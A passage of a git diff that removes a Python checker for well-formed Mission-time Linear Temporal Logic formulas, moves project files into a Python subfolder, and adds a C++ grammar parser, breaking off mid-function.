\/dev\/null\n@@ -1,275 +0,0 @@\n-from Custom_notation import *\n-\n-\"\"\"\n-This file implements the following Context-Free Grammar\n-for a well-formed formula for MLTL:\n-\n-Digit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019\n-Num  ->  Digit Num |  Digit\n-Interval  ->  \u2018[\u2019  Num \u2018,\u2019 Num \u2018]\u2019\n-Prop_var  ->  \u2018p\u2019 Num\n-\n-Prop_cons  ->  \u2018T\u2019 | \u2018F\u2019\n-Unary_Prop_conn  ->  \u2018~\u2019\n-Binary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019\n-\n-Temp_cons  ->  \u2018S\u2019\n-Unary_Temp_conn  ->  \u2018E\u2019 | \u2018A\u2019\n-Binary_Temp_conn  ->  \u2018U\u2019 | \u2018W\u2019\n-\n-\n-Wff  ->  Prop_var | Prop_cons | Temp_cons\n-                   | Unary_Prop_conn Wff | Unary_Temp_conn  Interval  Wff\n-                   | \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\u2019\n-\n-\n-\n-The Prop constants: True, False are represented by: \u2018T\u2019, \u2018F\u2019.\n-The Unary Prop connective: Negation is represented by: \u2018~\u2019.\n-The Binary Prop connectives: Or, And, Iff, Implies are represented by: \u2018v\u2019, \u2018&\u2019, \u2018=\u2019, \u2018>\u2019.\n-\n-The Temp constant: Start is represented by: \u2018S\u2019.\n-The Unary Temp connectives: Next, Eventually, Always are represented by: \u2018N\u2019, \u2018E\u2019, \u2018A\u2019.\n-The Binary Temp connectives: Until, Weak until are represented by: \u2018U\u2019, \u2018W\u2019.\n-\n-\"\"\"\n-\n-\n-# Digit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019\n-def Digit_check(s):\n-    return s == '0' or s == '1' or s == '2' or s == '3' or s == '4' or s == '5' or s == '6' or s == '7' or s == '8' or s == '9'\n-\n-\n-# Num  ->  Digit Num |  Digit\n-def Num_check(s):\n-    len_s = len(s)\n-    if (len_s == 1):\n-        return Digit_check(s)\n-\n-    char = Slice_char(s, 0)\n-    alpha = Slice(s, 1, len_s-1)\n-    return Digit_check(char) and Num_check(alpha)\n-\n-\n-# Interval  ->  \u2018[\u2019  Num \u2018,\u2019 Num \u2018]\u2019\n-def Interval_check(s):\n-    len_s = len(s)\n-\n-    left_bracket = Slice_char(s, 0)\n-    right_bracket = Slice_char(s, len_s-1)\n-\n-    # Parse for comma index\n-    comma_index = 1\n-    while(Num_check(Slice(s, 1, comma_index)) and comma_index <= len_s-1):\n-        comma_index = comma_index + 1\n-\n-    num_1 = Slice(s, 1, comma_index-1)\n-    comma = Slice_char(s, comma_index)\n-    num_2 = Slice(s, comma_index+1, len_s-2)\n-    return left_bracket == '[' and Num_check(num_1) and comma == ',' and Num_check(num_2) and right_bracket == ']'\n-\n-\n-# Prop_var  ->  \u2018p\u2019 Num\n-def Prop_var_check(s):\n-    len_s = len(s)\n-\n-    char = Slice_char(s, 0)\n-    alpha = Slice(s, 1, len_s-1)\n-    return char == 'p' and Num_check(alpha)\n-\n-\n-# Prop_cons  ->  \u2018T\u2019 | \u2018F\u2019\n-def Prop_cons_check(s):\n-    return s == 'T' or s == 'F'\n-\n-\n-# Unary_Prop_conn  ->  \u2018~\u2019\n-def Unary_Prop_conn_check(s):\n-    return s == '~'\n-\n-\n-# Binary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019\n-def Binary_Prop_conn_check(s):\n-    return s == 'v' or s == '&' or s == '=' or s == '>'\n-\n-\n-# Temp_cons  ->  \u2018S\u2019\n-def Temp_cons_check(s):\n-    return s == 'S'\n-\n-# Unary_Temp_conn  ->  \u2018E\u2019 | \u2018A\u2019\n-def Unary_Temp_conn_check(s):\n-    return s == 'E' or s == 'A'\n-\n-\n-# Binary_Temp_conn  ->  \u2018U\u2019 | \u2018W\u2019\n-def Binary_Temp_conn_check(s):\n-    return s == 'U' or s == 'W'\n-\n-\n-\n-# Wff  ->  Prop_var | Prop_cons | Temp_cons\n-#                   | Unary_Prop_conn Wff | Unary_Temp_conn  Interval  Wff\n-#                   | \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)\u2019\n-\n-def Wff_check(s):\n-    len_s = len(s)\n-\n-    # Prop_var | Prop_cons | Temp_cons\n-    if (Prop_var_check(s) or Prop_cons_check(s) or Temp_cons_check(s)):\n-        return True\n-\n-    # Unary_Prop_conn Wff\n-    if (Unary_Prop_conn_check(Slice_char(s, 0))):\n-        alpha = Slice(s, 1, len_s-1)\n-        return  Wff_check(alpha)\n-\n-    # Unary_Temp_conn  Interval  Wff\n-    if (Unary_Temp_conn_check(Slice_char(s, 0))):\n-        begin_interval = 1\n-        end_interval = 2\n-\n-        # Parse for end of interval\n-        while (Slice_char(s, end_interval) != ']' and end_interval <= len_s-1):\n-            end_interval = end_interval + 1\n-\n-        interval = Slice(s, begin_interval, end_interval)\n-        alpha = Slice(s, end_interval+1, len_s-1)\n-        return Interval_check(interval) and Wff_check(alpha)\n-\n-    # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n-    if (Slice_char(s, 0) == '(' and Slice_char(s, len_s-1) == ')'):\n-\n-        # Number of '(' in s\n-        left_count = 0\n-        # Number of ')' in s\n-        right_count = 0\n-\n-\n-        #    Parse for binary_conn_index in s\n-\n-        #    When left_count == right_count and s[binary_conn_index] is a binary connective,\n-        #    we are done parsing and have found binary_conn_index.\n-\n-        for binary_conn_index in Range(1, len_s-1, 1):\n-            char = Slice_char(s, binary_conn_index)\n-\n-            if(char == '('):\n-                left_count = left_count + 1\n-\n-            if(char == ')'):\n-                right_count = right_count + 1\n-\n-            # Done parsing for binary_conn_index.\n-            if(left_count == right_count and (Binary_Prop_conn_check(char) or Binary_Temp_conn_check(char))):\n-                break\n-\n-        binary_conn = Slice_char(s, binary_conn_index)\n-\n-        # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n-        if (Binary_Prop_conn_check(binary_conn)):\n-            alpha = Slice(s, 1, binary_conn_index-1)\n-            beta = Slice(s, binary_conn_index+1, len_s-2)\n-            return Wff_check(alpha) and Wff_check(beta)\n-\n-        # \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n-        if (Binary_Temp_conn_check(binary_conn)):\n-            begin_interval = binary_conn_index+1\n-            end_interval = binary_conn_index+2\n-\n-            # Parse for end of interval\n-            while (Slice_char(s, end_interval) != ']' and end_interval <= len_s-1):\n-                end_interval = end_interval + 1\n-\n-            alpha = Slice(s, 1, binary_conn_index-1)\n-            interval = Slice(s, begin_interval, end_interval)\n-            beta = Slice(s, end_interval+1, len_s-2)\n-            return Wff_check(alpha) and Interval_check(interval) and Wff_check(beta)\n-\n-    return False\n-\n-\n-# Given a well-formed MLTL formula wff,\n-# return the index of the primary binary connective.\n-# If this does not occur, return -1.\n-def primary_binary_conn(wff):\n-    len_wff = len(wff)\n-\n-    if (Slice_char(wff, 0) == '(' and Slice_char(wff, len_wff-1) == ')'):\n-        left_count = 0\n-        right_count = 0\n-\n-        for binary_conn_index in Range(1, len_wff-1, 1):\n-            char = Slice_char(wff, binary_conn_index)\n-\n-            if(char == '('):\n-                left_count = left_count + 1\n-\n-            if(char == ')'):\n-                right_count = right_count + 1\n-\n-            if(left_count == right_count and (Binary_Prop_conn_check(char) or Binary_Temp_conn_check(char))):\n-                break\n-\n-        return binary_conn_index\n-\n-    return -1\n-\n-\n-# Given a well-formed MLTL formula wff,\n-# return the tuple (begin_interval, comma_index, end_interval), giving the indexs\n-# for the primary interval occuring in the formula.\n-# This makes parsing for the temporal indexs easy.\n-#\n-# If there is no primary interval for the formula, return -1.\n-def primary_interval(wff):\n-    len_wff = len(wff)\n-\n-    # Unary_Temp_conn  Interval  Wff\n-    if (Unary_Temp_conn_check(Slice_char(wff, 0))):\n-        begin_interval = 1\n-\n-        # Parse for comma_index\n-        comma_index = begin_interval+1\n-        while (Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <= len_wff-1):\n-            comma_index = comma_index+1\n-\n-        # Parse for end_interval\n-        end_interval = comma_index+1\n-        while (Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <= len_wff-1):\n-            end_interval = end_interval + 1\n-\n-        return (begin_interval, comma_index, end_interval)\n-\n-\n-    # \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n-    binary_conn_index = primary_binary_conn(wff)\n-    if (Binary_Temp_conn_check(Slice_char(wff, binary_conn_index))):\n-        begin_interval = binary_conn_index+1\n-\n-        # Parse for comma_index\n-        comma_index = begin_interval+1\n-        while (Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <= len_wff-1):\n-            comma_index = comma_index+1\n-\n-        # Parse for end_interval\n-        end_interval = comma_index+1\n-        while (Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <= len_wff-1):\n-            end_interval = end_interval + 1\n-\n-        return (begin_interval, comma_index, end_interval)\n-\n-\n-    return -1\n-\n-\n-\n-\n-# Test Wff_check, primary_binary_conn, and primary_interval functions.\n-if __name__ == \"__main__\":\n-    wff = input (\"Enter MLTL formula : \")\n-    wff = strip_whitespace(wff)\n-    assert (Wff_check(wff)), \"Not a well-formed formula\"\n-\n-    print(\"primary_binary_conn: \" + str(primary_binary_conn(wff)))\n-    print(\"primary_interval: \" + str(primary_interval(wff)))\ndiff --git a\/MLTL_brute_forcer\/Custom_notation.py b\/MLTL_brute_forcer\/Python\/Custom_notation.py\nsimilarity index 100%\nrename from MLTL_brute_forcer\/Custom_notation.py\nrename to MLTL_brute_forcer\/Python\/Custom_notation.py\ndiff --git a\/MLTL_brute_forcer\/MLTL_semantics.py b\/MLTL_brute_forcer\/Python\/MLTL_semantics(NEED TO UPDATE).py\nsimilarity index 99%\nrename from MLTL_brute_forcer\/MLTL_semantics.py\nrename to MLTL_brute_forcer\/Python\/MLTL_semantics(NEED TO UPDATE).py\nindex 57135cb..060ab86 100644\n--- a\/MLTL_brute_forcer\/MLTL_semantics.py\n+++ b\/MLTL_brute_forcer\/Python\/MLTL_semantics(NEED TO UPDATE).py\t\n@@ -14,7 +14,6 @@\n Prop_array.\n '''\n \n-\n # Determines whether a given string is a bit string\n def Bit_string_check(s):\n     len_s = len(s)\ndiff --git a\/MLTL_brute_forcer\/MLTL_truth_table.py b\/MLTL_brute_forcer\/Python\/MLTL_truth_table.py\nsimilarity index 100%\nrename from MLTL_brute_forcer\/MLTL_truth_table.py\nrename to MLTL_brute_forcer\/Python\/MLTL_truth_table.py\ndiff --git a\/MLTL_brute_forcer\/README.md b\/MLTL_brute_forcer\/Python\/README.md\nsimilarity index 100%\nrename from MLTL_brute_forcer\/README.md\nrename to MLTL_brute_forcer\/Python\/README.md\ndiff --git a\/MLTL_brute_forcer\/Type_conversion.py b\/MLTL_brute_forcer\/Python\/Type_conversion.py\nsimilarity index 100%\nrename from MLTL_brute_forcer\/Type_conversion.py\nrename to MLTL_brute_forcer\/Python\/Type_conversion.py\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/Custom_notation.cpython-38.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/Custom_notation.cpython-38.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/Custom_notation.cpython-38.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/Custom_notation.cpython-38.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/Custom_notation.cpython-39.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/Custom_notation.cpython-39.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/Custom_notation.cpython-39.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/Custom_notation.cpython-39.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/LTL_semantics.cpython-38.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/LTL_semantics.cpython-38.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/LTL_semantics.cpython-38.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/LTL_semantics.cpython-38.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/LTL_semantics.cpython-39.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/LTL_semantics.cpython-39.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/LTL_semantics.cpython-39.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/LTL_semantics.cpython-39.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/LTL_wff.cpython-38.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/LTL_wff.cpython-38.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/LTL_wff.cpython-38.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/LTL_wff.cpython-38.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/LTL_wff.cpython-39.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/LTL_wff.cpython-39.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/LTL_wff.cpython-39.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/LTL_wff.cpython-39.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/MLTL_semantics.cpython-38.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/MLTL_semantics.cpython-38.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/MLTL_semantics.cpython-38.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/MLTL_semantics.cpython-38.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/MLTL_semantics.cpython-39.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/MLTL_semantics.cpython-39.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/MLTL_semantics.cpython-39.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/MLTL_semantics.cpython-39.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/MLTL_wff.cpython-38.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/MLTL_wff.cpython-38.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/MLTL_wff.cpython-38.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/MLTL_wff.cpython-38.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/MLTL_wff.cpython-39.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/MLTL_wff.cpython-39.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/MLTL_wff.cpython-39.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/MLTL_wff.cpython-39.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/PTL_semantics.cpython-38.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/PTL_semantics.cpython-38.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/PTL_semantics.cpython-38.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/PTL_semantics.cpython-38.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/PTL_wff.cpython-38.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/PTL_wff.cpython-38.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/PTL_wff.cpython-38.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/PTL_wff.cpython-38.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/PTL_wff.cpython-39.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/PTL_wff.cpython-39.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/PTL_wff.cpython-39.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/PTL_wff.cpython-39.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/Type_conversion.cpython-38.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/Type_conversion.cpython-38.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/Type_conversion.cpython-38.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/Type_conversion.cpython-38.pyc\ndiff --git a\/MLTL_brute_forcer\/__pycache__\/Type_conversion.cpython-39.pyc b\/MLTL_brute_forcer\/Python\/__pycache__\/Type_conversion.cpython-39.pyc\nsimilarity index 100%\nrename from MLTL_brute_forcer\/__pycache__\/Type_conversion.cpython-39.pyc\nrename to MLTL_brute_forcer\/Python\/__pycache__\/Type_conversion.cpython-39.pyc\ndiff --git a\/MLTL_brute_forcer\/false_output.txt b\/MLTL_brute_forcer\/Python\/false_output.txt\nsimilarity index 100%\nrename from MLTL_brute_forcer\/false_output.txt\nrename to MLTL_brute_forcer\/Python\/false_output.txt\ndiff --git a\/MLTL_brute_forcer\/Python\/grammar.cpp b\/MLTL_brute_forcer\/Python\/grammar.cpp\nnew file mode 100644\nindex 0000000..4c23fac\n--- \/dev\/null\n+++ b\/MLTL_brute_forcer\/Python\/grammar.cpp\n@@ -0,0 +1,841 @@\n+#include <string>\n+#include <tuple>\n+#include <stdexcept>\n+#include <iostream>\n+#include \"grammar.h\"\n+#include <vector>\n+#include \"reg.h\"\n+#include \"nnf_grammar.h\"\n+#include \"utils.h\"\n+\n+\/*\n+This file implements the following Context-Free Grammar:\n+For a well-formed mLTL formula,\n+\n+Alphabet = { \u20180\u2019, \u20181\u2019, \u2026, \u20189\u2019, \u2018p\u2019, \u2018(\u2018, \u2018)\u2019, \u2018[\u2019, \u2018]\u2019, ':', \u2018,\u2019 ,\n+                       \u2018T\u2019, \u2018!\u2019,\n+                       \u2018~\u2019, \u2018F\u2019, \u2018G\u2019,\n+                       \u2018v\u2019, \u2018&\u2019, \u2018=\u2019, \u2018>\u2019, \u2018U\u2019, \u2018R\u2019 }\n+\n+Digit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019\n+Num  ->  Digit Num |  Digit\n+Interval  ->  \u2018[\u2019  Num \u2018:\u2019 Num \u2018]\u2019\n+Prop_var  ->  \u2018p\u2019 Num\n+\n+Prop_cons  ->  \u2018T\u2019 | \u2018!\u2019\n+Unary_Prop_conn  ->  \u2018~\u2019\n+Binary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019\n+\n+Assoc_Prop_conn -> \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019\n+Array_entry -> Wff \u2018,\u2019 Array_entry  |  Wff\n+\n+Unary_Temp_conn  ->  \u2018F\u2019 | \u2018G\u2019\n+Binary_Temp_conn  ->  \u2018U\u2019 | \u2018R\u2019\n+\n+\n+Wff ->  Prop_var | Prop_cons\n+                 | Unary_Prop_conn Wff\n+\t             | Unary_Temp_conn  Interval  Wff\n+\n+\t             | '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  ']' ')'\n+                 | '(' Wff Binary_Prop_conn Wff ')'\n+                 | '(' Wff Binary_Temp_conn  Interval Wff ')'\n+\n+\n+The Prop constants: True, False are represented by: \u2018T\u2019, \u2018F\u2019.\n+The Unary Prop connective: Negation is represented by: \u2018~\u2019.\n+The Binary Prop connectives: Or, And, Iff, Implies are represented by: \u2018v\u2019, \u2018&\u2019, \u2018=\u2019, \u2018>\u2019.\n+\n+The Unary Temp connectives: Eventually, Always are represented by: \u2018F\u2019, \u2018G\u2019.\n+The Binary Temp connectives: Until, Weak until are represented by: \u2018U\u2019, \u2018R\u2019.\n+\n+*\/\n+\n+using namespace std;\n+\n+\n+\/*\n+ * Takes substring of given string from a to b.\n+ *\/\n+string Slice(string s, int a, int b){\n+\tint s_len = int(s.length());\n+  \t\n+  \tif (a < 0){\n+\t\ta = 0;      \n+    }\n+  \t\/\/ Now 0 <= a\n+  \t\n+  \tif (b > s_len-1){\n+    \tb = s_len-1;\t\n+    }\n+  \t\/\/ Now b <= s_len-1\n+  \t\n+  \tif (a > b){\n+      return \"\";\n+    }\n+  \t\/\/ Now a <= b\n+\n+\treturn s.substr(a, b-a+1);\n+}\n+\n+\n+\/*\n+ * Returns length 1 string at index i.\n+ *\/\n+string Slice_char(string s, int i){\n+    return Slice(s, i, i);\n+}\n+\n+\n+\/*\n+ * Digit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019\n+ * Checks that the inputted string is a digit.\n+ *\/\n+bool Digit_check(string s){\n+    return s == \"0\" or s == \"1\" or s == \"2\" or s == \"3\" \n+        or s == \"4\" or s == \"5\" or s == \"6\" or s == \"7\" or s == \"8\" or s == \"9\";\n+}\n+\n+\n+\/*\n+ * Num  ->  Digit Num |  Digit\n+ * Checks that the inputted string is of length 1 and then runs digit_check().\n+ *\/\n+bool Num_check(string s){\n+    int len_s = int(s.length());\n+    if (len_s == 1){\n+        return Digit_check(s);\n+    }\n+\n+    string c = Slice_char(s, 0);\n+    string alpha = Slice(s, 1, len_s-1);\n+    return Digit_check(c) and Num_check(alpha);\n+}\n+\n+\n+\/*\n+ * Interval  ->  \u2018[\u2019  Num \u2018,\u2019 Num \u2018]\u2019\n+ * Checks that the inputted string is of the form of an interval.\n+ *\/\n+bool Interval_check(string s){\n+    int len_s = int(s.length());\n+\n+    string left_bracket = Slice_char(s, 0);\n+    string right_bracket = Slice_char(s, len_s-1);\n+\n+    \/\/ Parse for comma index\n+    int comma_index = 1;\n+    while(Num_check(Slice(s, 1, comma_index)) and comma_index <= len_s-1){\n+        ++comma_index;\n+    }\n+\n+    string num_1 = Slice(s, 1, comma_index-1);\n+    string comma = Slice_char(s, comma_index);\n+    string num_2 = Slice(s, comma_index+1, len_s-2);\n+    return left_bracket == \"[\" and Num_check(num_1) and comma == \":\" \n+        and Num_check(num_2) and right_bracket == \"]\";\n+}\n+\n+\n+\/*\n+ * Prop_var  ->  \u2018p\u2019 Num\n+ * Checks that the inputted string is a propositional variable.\n+ *\/\n+bool Prop_var_check(string s){\n+    int len_s = int(s.length());\n+\n+    string c = Slice_char(s, 0);\n+    string alpha = Slice(s, 1, len_s-1);\n+    return c == \"p\" and Num_check(alpha);\n+}\n+\n+\n+\/*\n+ * Prop_cons  ->  \u2018T\u2019 | \u2018!\u2019\n+ * Checks that the inputted string is a propositional constant.\n+ *\/\n+bool Prop_cons_check(string s){\n+    return s == \"T\" or s == \"!\";\n+}\n+\n+\n+\/*\n+ * Unary_Prop_conn  ->  \u2018~\u2019\n+ * Checks that the inputted string is the negation symbol (the unary prop. connective).\n+ *\/\n+bool Unary_Prop_conn_check(string s){\n+    return s == \"~\";\n+}\n+\n+\n+\/*\n+ * Binary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019\n+ * Checks that the inputted string is a binary prop. connective (or, and, equivalence, implication).\n+ *\/\n+bool Binary_Prop_conn_check(string s){\n+    return s == \"v\" or s == \"&\" or s == \"=\" or s == \">\";\n+}\n+\n+\n+\/*\n+ * Assoc_Prop_conn -> \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019\n+ * Checks that the inputted string is an associative prop. connective (or, and, equivalence).\n+ *\/\n+bool Assoc_Prop_conn_check(string s){\n+    return s == \"v\" or s == \"&\" or s == \"=\";\n+}\n+\n+\n+\/*\n+ * Array_entry -> Wff \u2018,\u2019 Array_entry  |  Wff\n+ * Checks that the inputted string is an array of WFFs.\n+ * We use an array of WFFs, for example, when ANDing >2 formulas.\n+ *\/\n+bool Array_entry_check(string s){\n+    int len_s = int(s.length());\n+\n+    \/\/ Number of '(' in s\n+    int left_count = 0;\n+    \/\/ Number of ')' in s\n+    int right_count = 0;\n+\n+\n+    \/\/    Parse for comma_index in s\n+    \/\/    When left_count == right_count, we are done parsing and have found comma_index.\n+    int comma_index = 0;\n+    for (comma_index = 0; comma_index <= len_s-1; ++comma_index){\n+\n+        string c = Slice_char(s, comma_index);\n+\n+        if (c == \"(\") {\n+            ++left_count;\n+        }\n+        else if (c == \")\"){\n+            ++right_count;\n+        }\n+\n+        \/\/ Done parsing for comma_index.\n+        \n+        \/\/cout << s << \" \" << comma_index << \" \" << left_count << \" \" << right_count << endl;\n+\n+        if (left_count == right_count and c == \",\"){\n+            break;\n+        }\n+    }\n+\n+    return (Wff_check(Slice(s, 0, comma_index-1)) and Slice_char(s, comma_index) == \",\" \n+        and Array_entry_check(Slice(s, comma_index+1, len_s-1))) or Wff_check(s) ;\n+}\n+\n+\n+\/*\n+ * Unary_Temp_conn  ->  \u2018F\u2019 | \u2018G\u2019\n+ * Checks that the inputted string is F or G (the unary temporal connectives).\n+ *\/\n+bool Unary_Temp_conn_check(string s){\n+    return s == \"F\" or s == \"G\";\n+}\n+\n+\n+\/*\n+ * Binary_Temp_conn  ->  \u2018U\u2019 | \u2018R\u2019\n+ * Checks that the inputted string is U or R (the binary temporal connectives).\n+ *\/\n+bool Binary_Temp_conn_check(string s){\n+    return s == \"U\" or s == \"R\";\n+}\n+\n+\n+\/*\n+ *  Wff ->  Prop_var | Prop_cons\n+ *                  | Unary_Prop_conn Wff\n+ *                  | Unary_Temp_conn  Interval  Wff\n+ *                  | '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 ')'\n+ *                  | \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n+ *                  | \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)\n+ *  Checks that an inputted string is a WFF.\n+ *\/\n+\n+bool Wff_check(string s){\n+    int len_s = int(s.length());\n+\n+    \/\/ Prop_var | Prop_cons\n+    if (Prop_var_check(s) or Prop_cons_check(s)){\n+        return true;\n+    }\n+\n+    \/\/ Unary_Prop_conn Wff\n+    if (Unary_Prop_conn_check(Slice_char(s, 0))){\n+        string alpha = Slice(s, 1, len_s-1);\n+        return  Wff_check(alpha);\n+    }    \n+\n+    \/\/ Unary_Temp_conn  Interval  Wff\n+    if (Unary_Temp_conn_check(Slice_char(s, 0))){\n+        int begin_interval = 1;\n+        int end_interval = 2;\n+\n+        \/\/ Parse for end of interval\n+        while (Slice_char(s, end_interval) != \"]\" and end_interval <= len_s-1){\n+            end_interval = end_interval + 1;\n+        }\n+\n+        string interval = Slice(s, begin_interval, end_interval);\n+        string alpha = Slice(s, end_interval+1, len_s-1);\n+        return Interval_check(interval) and Wff_check(alpha);\n+    }\n+\n+    \/\/ '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 ')'\n+    if(Assoc_Prop_conn_check(Slice_char(s, 1))){\n+        int begin_array = 2;\n+        int end_array = len_s-2;\n+\n+        string array_entry = Slice(s, begin_array+1, end_array-1);\n+        return Slice_char(s, 0) == \"(\" \n+            and Slice_char(s, 2) == \"[\"\n+            and Array_entry_check(array_entry)\n+            and Slice_char(s, len_s - 2) == \"]\"\n+            and Slice_char(s, len_s - 1) == \")\"; \n+    }\n+\n+    \/\/ \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n+    if (Slice_char(s, 0) == \"(\" and Slice_char(s, len_s-1) == \")\"){\n+\n+        \/\/ Number of '(' in s\n+        int left_count = 0;\n+        \/\/ Number of ')' in s\n+        int right_count = 0;\n+\n+\n+        \/\/    Parse for binary_conn_index in s\n+\n+        \/\/    When left_count == right_count and s[binary_conn_index] is a binary connective,\n+        \/\/    we are done parsing and have found binary_conn_index.\n+\n+        int binary_conn_index = 1;\n+        for (binary_conn_index = 1; binary_conn_index <= len_s-1; ++binary_conn_index){\n+            string c = Slice_char(s, binary_conn_index);\n+\n+            if(c == \"(\"){\n+                ++left_count;\n+            }\n+\n+            if(c == \")\"){\n+                ++right_count;\n+            }\n+\n+            \/\/ Done parsing for binary_conn_index.\n+            if(left_count == right_count and (Binary_Prop_conn_check(c) or Binary_Temp_conn_check(c))){\n+                break;\n+            }\n+        }\n+\n+        string binary_conn = Slice_char(s, binary_conn_index);\n+\n+        \/\/ \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n+        if (Binary_Prop_conn_check(binary_conn)){\n+            string alpha = Slice(s, 1, binary_conn_index-1);\n+            string beta = Slice(s, binary_conn_index+1, len_s-2);\n+            return Wff_check(alpha) and Wff_check(beta);\n+        }\n+\n+        \/\/ \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n+        if (Binary_Temp_conn_check(binary_conn)){\n+            int begin_interval = binary_conn_index+1;\n+            int end_interval = binary_conn_index+2;\n+\n+            \/\/ Parse for end of interval\n+            while (Slice_char(s, end_interval) != \"]\" and end_interval <= len_s-1){\n+                end_interval = end_interval + 1;\n+            }\n+\n+            string alpha = Slice(s, 1, binary_conn_index-1);\n+            string interval = Slice(s, begin_interval, end_interval);\n+            string beta = Slice(s, end_interval+1, len_s-2);\n+            return Wff_check(alpha) and Interval_check(interval) and Wff_check(beta);\n+        }\n+    }\n+\n+    return false;\n+}\n+\n+\n+\/*\n+ * Returns the index of the primary binary connective of a WFF.\n+ *\/\n+int primary_binary_conn(string wff){\n+    int len_wff = int(wff.length());\n+\n+    \/\/ '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 ')'\n+    if (Assoc_Prop_conn_check(Slice_char(wff, 1))){\n+        return 1;\n+    }\n+\n+    \/\/ \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019  |  \u2018(\u2018 Wff 